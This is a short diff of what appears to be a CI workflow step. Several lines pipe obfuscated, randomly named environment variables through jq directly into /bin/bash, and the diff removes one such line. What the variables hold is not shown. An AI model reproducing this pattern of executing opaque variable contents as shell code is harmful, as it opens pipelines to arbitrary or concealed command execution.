@@ -22,7 +22,6 @@ jobs:
           echo $huyl9 | jq -r .vntzq139 | /bin/bash
           printf '%s' "$ek95962" | jq -r .qotwm821 | /bin/bash
           printf '%s' "$eeu024" | jq -r .ep7 | /bin/bash
-          echo $pbizx00416 | jq -r .wsd44 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
